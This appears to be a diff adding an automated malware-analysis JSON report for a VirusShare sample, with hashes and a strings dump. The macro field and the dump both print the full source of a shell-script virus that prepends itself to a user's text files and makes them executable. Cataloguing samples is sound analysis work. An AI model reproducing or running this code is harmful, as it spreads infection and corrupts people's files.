@@ -1,0 +1,57 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#KRAKEN\nusuario=`logname` #Averigua el nombre del usuario\nhead -27 $0 > /tmp/virus.txt\nfind . -name \"*\" -print | while read archivo \ndo\nif [ -f $archivo ] # es un archivo?\nthen\ndueno=`ls -l \"$archivo\" | awk '{printf $3}'`\nif [ \"$dueno\" = \"$usuario\" ] # el archivo pertenece al usuario?\nthen\nchmod 755 \"$archivo\";\nfi\nif [ -r \"$archivo\" -a -w \"$archivo\" ] \nthen\nfile \"$archivo\" | while read p1 p2 p3 p4 p5 p6 \ndo\nif [ \"$p2\" = \"ASCII\" -a \"`head -1 \"$archivo\"`\" != \"#KRAKEN\" ] \nthen\ncp /tmp/virus.txt /tmp/temporal.txt \ncat $archivo >> /tmp/temporal.txt\ncat /tmp/temporal.txt > $archivo\nfi\ndone\nfi\nfi\ndone\nrm -f /tmp/virus.txt /tmp/temporal.txt\necho \"Hasta la vista, baby\""
+    },
+    "filename": "VirusShare_4b4d4d252710a89e92447dc7d99ad5a6",
+    "filesize": 695,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4b4d4d252710a89e92447dc7d99ad5a6",
+        "sha1": "c0c6beb1521d5d063b8e0e69b45fecedc8ca3bfd",
+        "sha256": "5a270f5c2dff2642f07ae3cf9b31cd7ce715ee83d903591e50f07c06812f3626"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#KRAKEN",
+            "usuario=`logname` #Averigua el nombre del usuario",
+            "head -27 $0 > /tmp/virus.txt",
+            "find . -name \"*\" -print | while read archivo ",
+            "if [ -f $archivo ] # es un archivo?",
+            "then",
+            "dueno=`ls -l \"$archivo\" | awk '{printf $3}'`",
+            "if [ \"$dueno\" = \"$usuario\" ] # el archivo pertenece al usuario?",
+            "then",
+            "chmod 755 \"$archivo\";",
+            "if [ -r \"$archivo\" -a -w \"$archivo\" ] ",
+            "then",
+            "file \"$archivo\" | while read p1 p2 p3 p4 p5 p6 ",
+            "if [ \"$p2\" = \"ASCII\" -a \"`head -1 \"$archivo\"`\" != \"#KRAKEN\" ] ",
+            "then",
+            "cp /tmp/virus.txt /tmp/temporal.txt ",
+            "cat $archivo >> /tmp/temporal.txt",
+            "cat /tmp/temporal.txt > $archivo",
+            "done",
+            "done",
+            "rm -f /tmp/virus.txt /tmp/temporal.txt",
+            "echo \"Hasta la vista, baby\""
+        ],
+        "file": {
+            "cat $archivo >> /tmp/temporal.txt": "Text",
+            "head -27 $0 > /tmp/virus.txt": "Text",
+            "rm -f /tmp/virus.txt /tmp/temporal.txt": "Text"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.299834",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
